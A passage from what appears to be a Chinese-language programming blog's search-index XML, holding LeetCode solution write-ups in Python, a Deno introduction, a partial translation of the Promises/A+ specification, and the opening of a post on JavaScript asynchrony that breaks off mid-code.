[SUBCOMMAND]OPTIONS: -h, --help Prints help information -L, --log-level &lt;log-level&gt; Set log level [possible values: debug, info] -q, --quiet Suppress diagnostic output -V, --version Prints version informationSUBCOMMANDS: bundle Bundle module and dependencies into single file cache Cache the dependencies completions Generate shell completions doc Show documentation for module eval Eval script fmt Format source files help Prints this message or the help of the given subcommand(s) info Show info about cache or info related to source file install Install script as executable repl Read Eval Print Loop run Run a program given a filename or url to the module test Run tests types Print runtime TypeScript declarations upgrade Upgrade deno executable to newest versionENVIRONMENT VARIABLES: DENO_DIR Set deno&apos;s base directory NO_COLOR Set to disable color HTTP_PROXY Proxy address for HTTP requests (module downloads, fetch) HTTPS_PROXY Same but for HTTPS 输出当前版本是 0.40.0，可选参数、子命令和环境变量比起 Node 还很有限，是学习 Deno 的好时机。deno 可以执行远程脚本，且内置了 TS 编译器，如 1$ deno https://deno.land/std/examples/welcome.ts 简单体验后给人深入探索的欲望。 为什么要有 deno？作者本想用 JS 做机器学习相关的框架，但是发现 JS 发展太快了，早就不是 2009 年开发 Node 时候的 JS 了，基于 JavaScript 的发展和 Node 的不足，决定开发 Deno。 Deno 保持了 JS 单线程的特点，集成了 TS 编译器，去中心化的模块导入机制。 Deno 使用 Rust 开发，不在选用 C++， 参考视频： https://www.youtube.com/watch?v=lcoU9jtsK24 https://www.youtube.com/watch?v=1gIiZfSbEAE]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Programing-language</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Deno</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LeetCode 80 Remove Duplicates from Sorted Array II]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-80-remove-duplicates-from-sorted-array-ii%2F</url>
    <content type="text"><![CDATA[描述给定一个数组，删除部分元素使得所有元素最多重复两次。 Example 1: 12345Given nums = [1,1,1,2,2,3],Your function should return length = 5, with the first five elements of nums being 1, 1, 2, 2 and 3 respectively.It doesn&apos;t matter what you leave beyond the returned length. 分析基于 xx 题的思路，两个指针l, r, r 指向当前遍历元素 ，l 指向当前有效元素的末尾。思考： - l 和 r 起始位置应该在哪里? ~- l 和 r 的移动规则？ 首先 l 和 r 起始位置都在第 3 个元素，即 r = l = 3，因为前两个元素一定符合题意，因为最多重两次 判断 r 指向元素是否重复两次以上，如果否同时向后移动 l 和 r。 如果是则只移动 r 到下一个不与当前元素重复的元素，然后将 r 指向的元素复制到 l 指向的位置，再移动 r。 以上是我的思考，但是逻辑非常复杂，程序实现很困难。所以我放弃了这个思路，然后查阅资料发现此题和第一题近乎一模一样，只不过更新条件变更一下，看如下代码。 解题1234567def solve(A): new_tail = 2 for i in range(2, len(A)): if A[i] != A[new_tail - 2]: A[new_tail] = A[i] new_tail += 1 return new_tail 简直太简单了，发现还是自己太菜了，加强学习吧。]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1296. Divide Array in Sets of K Consecutive Numbers]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-1296-divide-array-in-sets-of-k-consecutive-numbers%2F</url>
    <content type="text"><![CDATA[描述题目描述 - https://leetcode.com/problems/divide-array-in-sets-of-k-consecutive-numbers给定一个数组 nums 和整数 k，判断是否将数组 nums 分成有 k 个连续数字组成的若干子数组。 Example 1: 123Input: nums = [1,2,3,3,4,4,5,6], k = 4Output: trueExplanation: Array can be divided into [1,2,3,4] and [3,4,5,6]. Example 2: 123Input: nums = [1,2,3,4], k = 3Output: falseExplanation: Each array should be divided in subarrays of size 3. 分析统计每个数字出现的次数放在一个 map 中，然后从最小元素开始暴力循环，只要 map 不为空，求得 map 中当前最小值 cur, 从 cur 开始，对于任意 0 到 k 满足： cur 存在 map 中 (cur in map) map[cur] 减 1 后，如果 map[cur] 已经为 0 则删除 cur 这个 key cur += 1 则说明可以被划分成多份 k 个连续的子数组，否则不可以。 代码12345678910111213class Solution: def isPossibleDivide(self, nums: List[int], k: int) -&gt; bool: map = collections.Counter(nums) while map: cur = min(map.keys()) for _ in range(k): if cur not in map: return False map[cur] -= 1 if map[cur] == 0: del map[cur] cur += 1 return True 提交后一遍通过。]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Greedy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-241 —— different ways to add parentheses]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-241-different-ways-to-add-parentheses%2F</url>
    <content type="text"><![CDATA[题目描述给定一个有数字和运算符组成的字符串，计算不同优先级的情况下的返回结果。 Example 1: 12345678Input: &quot;2*3-4*5&quot;Output: [-34, -14, -10, -10, 10]Explanation: (2*(3-(4*5))) = -34 ((2*3)-(4*5)) = -14 ((2*(3-4))*5) = -10 (2*((3-4)*5)) = -10 (((2*3)-4)*5) = 10 分析对于每个运算表达式，我们可以分解为 A op B 的形式。当 A 和 B 都是数字时，直接返回计算结果，否则拆分表达式。 122*3-4*5 split to =&gt;(2) * (B) or (2*3)-(B) 所以如下递归求解： 123456789101112131415161718192021def calc(x, op, y): if op == "+": return x + y if op == "-": return x - y else: return x * ydef solve(input): if input.isdigit(): return [int(input)] ans = [] for i, c in enumerate(input): if c in "+-*": left = solve(input[:i]) right = solve(input[i+1:]) for l in left: for r in right: ans.append(calc(l, c, r)) return ans]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Recursion</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-79 Word Search]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-79-word-search%2F</url>
    <content type="text"><![CDATA[描述在给定的 2D 平面 board 中搜索单词 word，可以在垂直相邻和水平相邻方向进行深度搜索，如果找到返回 True，否则返回 False。 12345678910board =[ [&apos;A&apos;,&apos;B&apos;,&apos;C&apos;,&apos;E&apos;], [&apos;S&apos;,&apos;F&apos;,&apos;C&apos;,&apos;S&apos;], [&apos;A&apos;,&apos;D&apos;,&apos;E&apos;,&apos;E&apos;]]Given word = &quot;ABCCED&quot;, return true.Given word = &quot;SEE&quot;, return true.Given word = &quot;ABCB&quot;, return false. 测试用例1234567891011board =[ ['A','B','C','E'], ['S','F','A','S'], ['A','E','F','E']]# Case 0: word is an empty string, word = '', return false# Case 1: genaral case - word = "ABFE", return true# Case 2: take backtracking under advisement, word = "AEFBCAFE", return true.# Case 3: word = "ADEF", return false 分析这是一个经典的 DFS 问题，对于一个坐标 (x, y) 可以往四个方向进行搜索，分别是 (x+1, y), (x-1, y), (x, y+1), (x, y-1)。四个方向只要有一个方向搜索成功即可，搜索成功的条件是搜索深度 d == len(word)-1。而搜素失败的原因有很多： (x, y) 出界； (x, y) 已经使用过（题目要求每个坐标只能使用一次）； 当前的 (x, y) 对应的值和 word[d] 不相等。 根据以上分析，构造 dfs 函数需要的参数有 x, y 和 d，其中 d 表示搜索的深度。此外，还需要一个保存搜索过的坐标的辅助变量，这个变量可以放在全局。考虑搜索失败的情况，代码如下： 123456789visited = set()def dfs(x, y, d): if out_of_bound(x, y): return False if (x, y) in visited: return False if board[x][y] != word[d]: return False # TODO 如果当前坐标 (x, y) 满足条件 board[x][y] == word[d] 且 d == len(word) - 1 则搜索成功，代码如下 12345678910visited = set()def dfs(x, y, d): if out_of_bound(x, y): return False if (x, y) in visited: return False if board[x][y] != word[d]: return False if d == len(word) - 1: return True 否则继续往当前坐标的四个方向深入搜索，同时将当前坐标加入到 visited 中，表示当前坐标已经访问过， 12345678910111213141516171819202122visited = set()def dfs(x, y, d): if out_of_bound(x, y): return False if (x, y) in visited: return False if board[x][y] != word[d]: return False if d == len(word) - 1: return True # continue dfs visited.add((x,y)) dx = [0, 1, 0, -1] dy = [1, 0, -1, 0] found = False for i in range(4): new_x = x + dx new_y = y + dy found = found or dfs(new_x, new_y, d+1) return found 如上，代码基本结构已经完成，大部分测试已经通过。但是， 考虑具有回溯情况的 Case 2 ，以上代码会失。这是因为如果坐标 (x,y) 的某个方向深入搜索多个步骤后失败，最终还会回到 (x, y) 上进行下一个方向的尝试，可是在进行下一个方向搜索时，上次的失败搜索并没有释放搜索过的坐标，导致有些坐标在本次搜索不能被访问，最终搜索失败。 所以，对于当前坐标的搜索，如果四个方向都搜索失败，则需要释放当前的 (x, y)，即 回溯。如下： 1234567891011121314151617181920212223visited = set()def dfs(x, y, d): if out_of_bound(x, y): return False if (x, y) in visited: return False if board[x][y] != word[d]: return False if d == len(word) - 1: return True # continue dfs visited.add((x,y)) dx = [0, 1, 0, -1] dy = [1, 0, -1, 0] found = False for i in range(4): new_x = x + dx new_y = y + dy found = found or dfs(new_x, new_y, d+1) if not found: visited.remove((x, y)) return found 代码实现根据如上分析，代码实现如下（实现使用 used 数组保存访问过的坐标，和用集合 visited 功能一致）： 123456789101112131415161718192021222324252627282930313233343536373839class Solution: def exist(self, board: List[List[str]], word: str) -&gt; bool: if not board or not word: return False m, n = len(board), len(board[0]) used = [[False] * n for _ in range(m)] def dfs(x, y, pos): # x, y out of bound if x &lt; 0 or x &gt;= m or y &lt; 0 or y &gt;= n: return False # word[pos] not equals to board[x][y] if word[pos] != board[x][y]: return False # (x, y) already used if used[x][y]: return False # pos == len(word)-1 if pos == len(word) - 1: return True used[x][y] = True dx = [0, 1, 0, -1] dy = [1, 0, -1, 0] found = False for i in range(4): new_x = x + dx[i] new_y = y + dy[i] found = found or dfs(new_x, new_y, pos+1) # backtrack if not found: used[x][y] = False return found for i in range(m): for j in range(n): if dfs(i, j, 0): return True return False 改进： 如上代码使用额外空间来记录访问过的坐标，以避免重复访问，有个技巧可以使用 O(1) 的空间记录访问过的节点。我们只需要用一个特殊符号如 “#” 将访问过的坐标值替换，勾勒出访问路径，并在当前坐标搜索完成后将原来的值替换回来即可。如下： 1234567891011121314151617181920212223242526272829303132333435class Solution: def exist(self, board: List[List[str]], word: str) -&gt; bool: if not board or not word: return False m, n = len(board), len(board[0]) def dfs(x, y, pos): # x, y out of bound if x &lt; 0 or x &gt;= m or y &lt; 0 or y &gt;= n: return False # word[pos] not equals to board[x][y] if word[pos] != board[x][y]: return False # pos == len(word)-1 if pos == len(word) - 1: return True orignal = board[x][y] board[x][y] = "#" dx = [0, 1, 0, -1] dy = [1, 0, -1, 0] found = False for i in range(4): new_x = x + dx[i] new_y = y + dy[i] found = found or dfs(new_x, new_y, pos+1) # backtrack board[x][y] = orignal return found for i in range(m): for j in range(n): if dfs(i, j, 0): return True return False]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>Backtrack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-992 Subarrays with K Differant Integers]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-992-subarrays-with-k-different-integers%2F</url>
    <content type="text"><![CDATA[题目描述 https://leetcode.com/problems/subarrays-with-k-different-integers/ 给定一个数组 A，求有 k 个不同元素组成的子数组个数。 例如： 123Input: A = [1,2,1,2,3], K = 2Output: 7Explanation: Subarrays formed with exactly 2 different integers: [1,2], [2,1], [1,2], [2,3], [1,2,1], [2,1,2], [1,2,1,2]. 测试用例根据题意，数组长度 n 的取值区间为 [1, 20000]，数组元素取值区间为 [1, n]，说明最多可能有 n 个不同元素，k 取值区间也是 [1, n]，需要考虑 k &gt; count(distinct A[i]) 的情况。考虑如下测试用例： 123456// Case 0: k &gt; count(distinct A[i])A = [1, 1, 1, 1, 1], k = 2Output: 0// Case 1: k == count(distinct A[i])A = [1, 1, 2, 3], k = 3// Case 2: k &lt; count(distinct A[i]) 分析第一眼看应该是使用滑窗，根据之前的总结滑窗的模板如下 12345678910111213class Solution: def slidingWindowTemplate(s, t): # 定义其他变量，存储结果，存储判断条件等变量 begin = end = 0 while f(end): # case 1: slide end # do something end += 1 while g(): # case 2: slide begin # do something begin += 1 # meet some condition 使用滑窗需要思考两个问题： 什么时候滑动 end 指针？ 什么时候滑动 begin 指针？ 经过思考直接求解不好求，我们换个思路：最多包含 k 个不同元素的子数组有多少个？滑窗 + HashMap 是解决这类问题最常用的方案。代码如下： 123456789101112131415161718192021def atMostKDistinct(A, k): begin = end = 0 window = collections.defaultdict(int) n, distinct = len(A), 0 # distinct indicate count of sliding window ans = 0 while end &lt; n: e = A[end] if window[e] == 0: distinct += 1 window[e] += 1 end += 1 while distinct &gt; k: b = A[begin] window[b] -= 1 if window[b] == 0: distinct -= 1 begin += 1 # [begin, end) has end - begin items that is numbers of subarray end of A[end] ans += end - begin return ans 记 f(k) 为小于等于 k 个不同元素的子数组个数，则 f(k-1) 为小于等于 k - 1 个不同元素的子数组个数。所以，确切的有 k 个不同元素的子数组个数 = f(k) - f(k-1)。 代码根据如上分析，完整代码如下： 123456789101112131415161718192021222324class Solution: def subarraysWithKDistinct(self, A: List[int], k: int) -&gt; int: def atMostKDistinct(k): begin = end = 0 window = collections.defaultdict(int) n, distinct = len(A), 0 # distinct indicate count of sliding window ans = 0 while end &lt; n: e = A[end] if window[e] == 0: distinct += 1 window[e] += 1 end += 1 while distinct &gt; k: b = A[begin] window[b] -= 1 if window[b] == 0: distinct -= 1 begin += 1 # [begin, end) has end - begin items that is end - begin subarrays ans += end - begin return ans return atMostKDistinct(k) - atMostKDistinct(k-1) 在 [begin, end) 区间中，以 A[end-1] 结尾的子数组个数是 end - begin，所以 ans += end - begin 相关题目 - https://leetcode.com/problems/count-number-of-nice-subarrays/]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Sliding Window</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[滑动窗口解题模板]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-sliding-window-template%2F</url>
    <content type="text"><![CDATA[题目要求类型 1： 给定两个字符串 s 和 t，找满足某种变化规律的字串/最大字串/最大字串长度等。 类型 2：给定字符串 s，查找满足某种条件的最大/最小窗口。 解题模板123456789101112class Solution: def slidingWindowTemplate(s, t): # 定义其他变量，存储结果，存储判断条件等变量 begin = end = 0 while f(): # case 1: slide end # do something end += 1 while g(): # case 2: slide begin # do something begin += 1 # meet some condition 模版变形： 前后指针同步移动可以简化为一层循环 exactly(K) = atMost(K) - atMost(K-1) 案例应用案例 1： Leetcode 424Medium: Longest Repeating Character Replacement 给定一个字符串 s 和整数 k，求 s 变换 k 次后得到的最长重复子串是多长。其中变换规律是：每次操作可以将一个字符变化成任意字符。重复字符串是指所有字符都相同的字符串。 end 每次滑动要做啥： 累计 s[end] 出现的次数。如果 s[end] 出现次数大于了窗口中最大重复次数，则更新最大重复次数。如果窗口长度大于 k + max_count 则需要移动 begin 指针。 begin 指针移动要做啥： 1234567891011121314151617181920212223class Solution: def characterReplacement(self, s: str, k: int) -&gt; int: if not s: return 0 begin = end = 0 map = collections.defaultdict(int) max_count = max_len = 0 while end &lt; len(s): c = s[end] map[c] += 1 max_count = max(max_count, map[c]) end += 1 while end - begin &gt; k + max_count: b = s[begin] map[b] -= 1 begin += 1 max_len = max(max_len, end - begin) return max_len 案例 2：Max Consecutive Ones IIIMedium: https://leetcode.com/problems/max-consecutive-ones-iii/solution/ 给定一个只有 0 和 1 的数组 A 和一个操作次数 K，每次操作可以从 0 变成 1，求在 k 次操作下最大子数组的长度。 12345678910111213141516171819class Solution: def longestOnes(self, A: List[int], k: int) -&gt; int: begin = end = 0 max_len = 0 nums_one = 0 while end &lt; len(A): if A[end] == 1: nums_one += 1 end += 1 while end - begin &gt; nums_one + k: if A[begin] == 1: nums_one -= 1 begin += 1 max_len = max(max_len, end - begin) return max_len 案例 3：Grumpy Bookstore OwnerMedium: https://leetcode.com/problems/grumpy-bookstore-owner/ 1234567891011121314151617181920212223class Solution: def maxSatisfied(self, cus: List[int], gru: List[int], x: int) -&gt; int: init_sum = max_sum = 0 n = len(cus) for i in range(n): if gru[i] == 0: init_sum += cus[i] begin = end = 0 while end &lt; n: if gru[end] == 1: init_sum += cus[end] # [begin, end] while end - begin == x: if gru[begin] == 1: init_sum -= cus[begin] begin += 1 max_sum = max(max_sum, init_sum) end += 1 # 考虑清楚下次 end 移动之前要做哪些事情 return max_sum 案例 4： Longest Substring Without Repeating CharactersMedium: https://leetcode.com/problems/longest-substring-without-repeating-characters/ 123456789101112131415161718192021222324252627class Solution: def lengthOfLongestSubstring(self, s: str) -&gt; int: map = collections.defaultdict(int) counter = 0 begin = end = 0 max_len = 0 while end &lt; len(s): e = s[end] map[e] += 1 if map[e] &gt; 1: # e is repeating counter += 1 # counter is number of repeating end += 1 while counter &gt; 0: # has repeated number b = s[begin] if map[b] &gt; 1: counter -= 1 map[b] -= 1 begin += 1 max_len = max(max_len, end - begin) return max_len 案例 5： Get Equal Substrings Within BudgetMedium: https://leetcode.com/problems/get-equal-substrings-within-budget/ 12345678910111213141516class Solution: def equalSubstring(self, s: str, t: str, cost: int) -&gt; int: begin = end = 0 max_len = 0 while end &lt; len(s): cost -= abs(ord(s[end]) - ord(t[end])) end += 1 while cost &lt; 0: cost += abs(ord(s[begin]) - ord(t[begin])) begin += 1 max_len = max(end - begin, max_len) return max_len 案例 6：Permutation in StringMedium: https://leetcode.com/problems/permutation-in-string/ 123456789101112131415161718192021222324252627class Solution: def checkInclusion(self, s1: str, s2: str) -&gt; bool: d = collections.Counter(s1) counter = len(d) begin = end = 0 while end &lt; len(s2): e = s2[end] if e in d: d[e] -= 1 if d[e] == 0: counter -= 1 end += 1 while counter == 0: b = s2[begin] if b in d: d[b] += 1 if d[b] &gt; 0: counter += 1 if end - begin == len(s1): return True begin += 1 return False 案例 7： Minimum Window Substringhttps://leetcode.com/problems/minimum-window-substring/ 123456789101112131415161718192021222324252627282930313233class Solution: def minWindow(self, s: str, t: str) -&gt; str: map = collections.Counter(t) found = False begin = end = 0 counter = len(map) start = 0 min_len = len(s) while end &lt; len(s): e = s[end] if e in map: map[e] -= 1 if map[e] == 0: counter -= 1 end += 1 while counter == 0: found = True b = s[begin] if b in map: map[b] += 1 if map[b] &gt; 0: counter += 1 if end - begin &lt; min_len: min_len = end - begin start = begin begin += 1 return s[start: start + min_len] if found else ""]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Sliding Window</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二分法解题模板]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-binary-search-template%2F</url>
    <content type="text"><![CDATA[二分法今天重新审视了二分法，结合同事的思考认为， 二分的本质是，在一段或多段单调序列里找分界点 使用左开右闭 [l, r) 的模板如下： 123456789def binary_search(l, r): while l &lt; r: m = l + (r - l) // 2 if f(m): return m # optional if g(m): r = m # new range [l, m) else: l = m + 1 # new range [m+1, r) return l # or not found m 如果满足查找条件，即 f(m) 返回 true，则查找结束。如果 f(m) 返回 false， 则根据 g(m) 的结果构造新的查找区间。如果新区间在左边，则新的左闭右开区间是 [l, m) 等价于 [l, m-1]；如果新区间在右边，则新的左闭右开是 [m+1, r)。 Return the lower_bound / upper_bound of a value x in a sorted array. lower_bound(A, x): first index of i, such that A[i] &gt;= x 12345678def lower_bound(A, x, l, r): while l &lt; r: m = (l + r) // 2 if A[m] &gt;= x: r = m else: l = m + 1 return l if A[m] == x, still need to update right bound to m as there are probable mutiple x at the left of m. upper_bound(A, x): first index of i, such that A[i] &gt; x 12345678def upper_bound(A, x, l, r): while l &lt; r: m = (l + r) // 2 if A[m] &gt; x: r = m else: l = m + 1 return l 案例应用案例 1：Capacity to Ship Packages Within D Dayshttps://leetcode.com/problems/capacity-to-ship-packages-within-d-days/ 1234567891011121314151617181920212223class Solution: def shipWithinDays(self, weights: List[int], D: int) -&gt; int: l, r = max(weights), sum(weights) while l &lt; r: m = (l + r) // 2 s = 0 rounds = 1 for i in range(len(weights)): if s + weights[i] &lt;= m: s += weights[i] else: # overload, need next round s = weights[i] rounds += 1 if rounds &lt;= D: r = m else: l = m + 1 return l 案例 2：Coko Eating Bananashttps://leetcode.com/problems/koko-eating-bananas/ 12345678910111213141516class Solution: def minEatingSpeed(self, piles: List[int], H: int) -&gt; int: l, r = 1, max(piles) + 1 while l &lt; r: m = l + (r - l) // 2 time = 0 for x in piles: time += math.ceil(x / m) if time &lt;= H: r = m else: l = m + 1 return l]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Binary Search</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-650 —— 2 Keys Keyboard]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-650-2-keys-keyboard%2F</url>
    <content type="text"><![CDATA[题目描述剪切板中初始状态下只有一个字母 ‘A’，只允许复制全部和粘贴全部操作，使用最小的操作步骤得到 n 个字符 ‘A’。 测试用例根据题意，n 的取值区间为 [1, 1000] 1234567// Case 0: n 等于 1// Case 1: n 是偶数// Case 2: n 是奇数// Case 3: 你是质数 分析 如果 n 是偶数，f(n) = f(n/2) + 2 复制一次，粘贴一次 如果 n 是奇数， 若 n 是质数，则 f(n) = n 零 m * x == n，假设 x &gt;= m 则 f(n) = m + f(x)，复制一次，粘贴 m - 1次。 代码1234567891011121314151617181920212223class Solution: def minSteps(self, n: int) -&gt; int: if n == 1: #1 return 0 def calc(n): if n &lt;= 3: return n if n % 2 == 0: return calc(n//2) + 2 else: r = int(math.sqrt(n)) m = 0 for i in range(2, r+1): if n % i == 0: m = n // i break #2 if m &gt; 0: return n // m + calc(m) else: return n return calc(n) 注意两点： #1考虑 n == 1 的基本情况 #2 找最大因数时找到之后一定要跳出循环]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Stack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Promises/A+ 标准翻译]]></title>
    <url>%2Ffundamental%2Fprogramming-language%2Fjavascript%2Fdev-translate-promise-a-plus-specification%2F</url>
    <content type="text"><![CDATA[一个健全的、可互操作的 JavaScript Promise 标准 —— 由开发者而定，为开发者而生。 promise代表异步操作的最终结果。Promise 开放的最原始接口是 then 方法，由该方法注册的回调函数来接受 Promise 成功状态（fulfilled）下返回的值或失败状态（rejected）下返回的错误信息。 本规范详细定义了 then 方法的行为，提供了 Promise 可互操作的基础，所有 Promises/A+ 兼容的 Promise 实现都可以参考该规范。因此，该规范是非常稳定的。 尽管 Promises/A+ 组织有时会为了向后兼容而对此规范做小的改动，但只有经过深思熟虑，充分讨论和测试之后，我们才会集成有较大改动的或向后兼容的版本更改。 Promises/A+ 阐明了早期 Promises/A 草案 的行为条款，在此基础上扩展其涵盖 de facto 的所有行为，并且省略了未指定或有问题的部分。 最后，Promises/A+ 规范的核心不涉及如何创建，完成或拒绝 Promise，而是专注于提供不同实现的 Promise 可互操作的 then 方法。 当然，不排除未来的规范会涉及这些主题。 1. 术语 “promise” 是一个有 then 方法的对象或者函数，then 方法的所有行为都符合本规范。 “thenable” 是一个定义了 then 方法的对象或者函数。 “value” 是 JavaScript 任意数据类型的值（包括 undefined 、 thenable 或者 promise） “exception” 是由 throw 抛出的异常。 “reason” 表示 Promise 失败的原因。 2. 标准2.1 Promise 的状态一个 Promise 的状态必须是 pending、 fulfilled 或者 rejected。 2.1.1 当 Promise 处于 pending 状态： 2.1.1.1 Promise 可能会转变成 fulfilled 或者 rejected 中的一种。 2.1.2 当 Promise 处于 fulfilled 状态： 2.1.2.1 Promise 状态必须保持不变。 2.1.2.1 Promise 必须有一个 value，并且它的值不会改变。 2.1.3 当 Promise 处于 rejected 状态： 2.1.3.1 Promise 状态必须保持不变。 2.1.3.2 Promise 必须有一个 reason，并且它的值不会改变。 这里的不会改变指的是恒定不变(===)，但不意味着深拷贝不变（这句话我暂时还没理解，附上原文如下）。 Here, “must not change” means immutable identity (i.e. ===), but does not imply deep immutability. 2.2 then 方法Promise 必须提供一个 then 方法用于获取 Promise 当前或最终的 value 或 reason。 then 方法接收两个参数： 1promise.then(onFulfilled, onRejected) 2.2.1 onFulfilled 和 onRejected 都是可选参数： 2.2.1.1 如果 onFulfilled 不是函数，必须忽略它。 2.2.1.2 如果 onRejected 不是函数，必须忽略它。 2.2.2 如果 onFulfilled 是一个函数： 2.2.2.1 它必须在 Promise 变成 fulfilled 状态后以 Promise 的 value 作为第一个参数被调用。 2.2.2.2 它不能在 Promise 变成 fulfilled 状态以前调用。 2.2.2.3 它只能被调用一次。 2.2.3 如果 onRejected 是一个函数： 2.2.3.1 它必须在 Promise 变成 rejected 状态后以 Promise 的 reason 作为第一个参数被调用。 2.2.3.2 它不能在 Promise 变成 rejected 状态以前调用。 2.2.3.3 它只能被调用一次。 2.2.4 onFulfilled 或 onRejected 不能在执行栈(execution context) 仅包含平台代码之前调用。 2.2.5 onFulfilled 和 onRejected 必须以函数形式被调用（不能传递 this 指针）。 2.2.6 同一个 Promise 的 then 方法可能被多次调用。 2.2.6.1 当且仅当 Promise 变成 fulfilled 后，各个 onFullfilled 回调必须按照原始的调用顺序被依次执行。 2.2.6.2 当且仅当 Promise 变成 rejected 后，各个 onRejected 回调必须按照原始的调用顺序被依次执行。 2.2.7 then 方法必须返回一个新的 Promise。 1promise2 = promise1.then(onFulfilled, onRejected); 2.2.7.1 如果 onFulfilled 或 onRejected 返回一个值 x，则执行 Promise 解析过程 [[Resolve]](promise2, x)。 2.2.7.2 如果 onFulfilled 或 onRejected 抛出异常 e，则执行 Promise 解析过程 [[Resolve]](promise2, e)。 2.2.7.3 如果 onFulfilled 不是一个函数，promise1 处于 fulfilled 状态，则 promise2 必须变成 fulfilled 状态且 vale 和 promise1 相同。 2.2.7.4 如果 onRejected 不是一个函数，promise1 处于 rejected 状态，则 promise2 必须变成 rejected 状态且 reason 和 promise1 相同。 2.3 Promise 处理程序Promise 处理程序是一个抽象过程，以一个 Promise 和 value 作为输入，表示为 [[Resolve]](promise, x)。如果 x 是一个 thenable 对象，则 promise 将直接采用 x 的状态，否则 promise 会试图变成 fulfilled 状态，且其 value 等于 x。 thenable 的处理程序允许不同 Promise 可以互相操作，只要它们提供一个兼容 Promises/A+ 的 then 方法。它还允许 Promises/A+ 实现使用合理的 then 方法“集成”不符合标准的实现。 [[Resolve]](promise, x) 按如下步骤执行： 2.3.1 如果 promise 和 x 是同一个对象，则 promise 变成 rejected，reason 是一个 TypeError 异常。 2.3.2 如果 x 是一个 Promise，则 promise 采用 x 的状态： 如果 x 处于 pending 状态，则 promise 必须保持 pending 状态直到 x 的状态变成 fulfilled 或 rejected。 当且仅当 x 变成 fulfilled， promise 也以相同的 value 变成 fullfiled 状态。 当且仅当 x 变成 rejected，promise 也以相同的 reason 变成 rejected 状态。 2.3.3 如果 x 是一个对象或者一个函数： 把 x.then 赋值给 then 如果引用 x.then 属性时抛出异常 e，那么用 e 作为 promise 的 reason 将其变成 rejected 状态。 如果 then 是一个函数，则以 x 作为 this， resolvePromise 作为第一个参数，rejectePromise 作为第二参数调用它。 // TODO …… 3. 注解]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Programing-language</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Promise</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScipr 异步和 Promise]]></title>
    <url>%2Ffundamental%2Fprogramming-language%2Fjavascript%2Fdev-implement-promise-step-by-step%2F</url>
    <content type="text"><![CDATA[异步概述我们知道 JavaScirpt 有单线程和异步的特点，为什么 JavaScript 不使用多线程？为什么 JavaScript 要使用异步？ 为什么要单线程？ JavaScript does not support multi-threading because the JavaScript interpreter in the browser is a single thread (AFAIK). Even Google Chrome will not let a single web page’s JavaScript run concurrently because this would cause massive concurrency issues in existing web pages. All Chrome does is separate multiple components (different tabs, plug-ins, etcetera) into separate processes, but I can’t imagine a single page having more than one JavaScript thread. 为什么要异步？ 在单核 CPU 的机器上，所谓的并发都只是理论上的，CPU 在特定的时刻只能执行一个任务。随着计算机的发展，今天的计算机几乎都是多核的，同一时刻不同的 CPU 执行着各自的任务，着才是真正意义上的并发。在 JavaScript 中，往往有些任务耗时较长，且这些任务有 JavaScript 发起但并没有一直在占用解释器线程，也就是说这些任务需要其他进程（线程）做额外的处理。如果同步执行这些任务将会导致 UI 阻塞，影响用户体验。 UI 加载图片 A 和 B 耗时为 $T_A$ 和 $T_B$，如果同步执行总耗时为： $$ T_A + T_B$$ 如果异步执行，总耗时为： $$max(T_A, T_B)$$ 随着应用复杂性的增加，异步任务会越来越多，同步与异步的优劣为凸显出来。 如何在单线程中实现异步？ – Event Loop 在 JavaScript 中，所有的代码都是有序执行的， 123456let a = 1;console.log(a);let b = 2;console.log(b);// output: 1 2 所谓的异步只不过是编排代码执行顺序的一种方式， 1234567setTimeout(function() &#123; console.log(1);&#125;, 1000);console.log(2);// output: 2 1// why? 所有的异步任务最终解决方案都是回调函数，Promise 和 Genarator 都是基于回调函数的上层建筑。那么，基于回调函数的异步是如何实现的呢？ 不同的 JavaScript 解释器对异步的实现细节不尽相同，但他们的本质是一样的，那就是事件循环。一段 JavaScript 代执行时，会将任务分为两类（这种任务的分类是广义的，为了简化问题本文使用这种定义）： 同步任务 异步任务 简单来说， 同步任务在主线程中执行，异步任务有专门的线程执行（AJAX 线程） 异步线程执行完成后进入事件队列 主线程会在同步任务执行完成后会读取事件队列中的异步任务的结果并执行回调函数 上述过程不断重复，直到所有任务都执行完成，着就是常说的事件循环 (Event Loop) 异步的解决方案之 Promise参考 https://promisesaplus.com/ 标准。 Promise 使用使用 Promise 读取 hello.txt 文件，代码如下： 1234567891011121314const fs = require("fs");const samplePromise = new 